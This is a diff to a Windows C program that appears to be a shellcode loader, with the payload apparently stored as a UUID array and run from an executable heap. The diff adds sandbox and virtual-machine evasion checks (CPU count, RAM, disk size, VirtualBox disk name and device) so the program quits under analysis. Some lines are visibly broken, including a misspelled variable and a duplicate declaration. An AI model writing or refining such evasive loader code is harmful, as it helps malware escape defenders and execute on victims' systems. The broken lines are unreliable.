@@ -26,6 +26,46 @@ const char* uuids[] = {
 };
 
 int main() {
+	SYSTEM_INFO systemInfo;
+	GetSystemInfo(&systemInfo);
+	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+	if (numberofProcessors < 2) return false;
+
+	MEMORYSTATUSEX memoryStatus;
+	memoryStatus.dwLength = sizeof(memoryStatus);
+	GlobalMemoryStatusEx(&memoryStatus);
+	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+	if (RAMMB < 2048) return false;
+
+	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+	DISK_GEOMETRY pDiskGeometry;
+	DWORD bytesReturned;
+	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
+	DWORD diskSizeGB;
+	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+	if (diskSizeGB < 100) return false;
+
+	HDEVINFO hDeviceInfo = SetupDiClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
+	SP_DEVINFO_DATA deviceInfoData;
+	deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+	SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);
+	DWORD propertyBufferSize;
+	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
+	PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
+	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
+	CharUpperW(HDDName);
+	if (wcsstr(HDDName, L"VBOX")) return false;
+
+	OBJECT_ATTRIBUTES objectAttributes;
+	UNICODE_STRING uDeviceName;
+	RtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));
+	RtlInitUnicodeString(&uDeviceName, L"\\Device\\VBoxGuest");
+	InitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);
+	HANDLE hDevice = NULL;
+	IO_STATUS_BLOCK ioStatusBlock;
+	NTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
+	if (NT_SUCCESS(status)) return false;
+
 	int elems = sizeof(uuids) / sizeof(uuids[0]);
 	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
 	VOID* mem = HeapAlloc(hc, 0, 0x100000);
